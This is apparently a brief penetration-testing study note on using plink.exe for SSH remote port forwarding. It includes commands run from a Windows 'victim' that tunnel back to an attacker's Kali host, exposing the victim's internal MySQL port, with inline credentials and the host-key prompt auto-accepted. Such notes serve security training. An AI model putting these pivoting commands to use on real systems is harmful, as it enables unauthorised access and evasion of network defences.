03- Plink.exe


Intro

  • windows based command line ssh
  • similar syntax to ssh
  • cmd.exe /c echo y |plink.exe -ssh -l kali -pw ilak -R <remote>:1234:127.0.0.1:3306 <rmote ssh> // with no interactivity
    • plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4 //connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali user (-l kali) with a password of "ilak" (-pw ilak) to create a remote port forward (-R) of port 1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306) with the following command:
    • remote port forwarding
    • username: kali
    • no interaction pipe y
    • use case : launch it from victim to ssh kali (remote) so that we could access the port open in windows victiom within kali
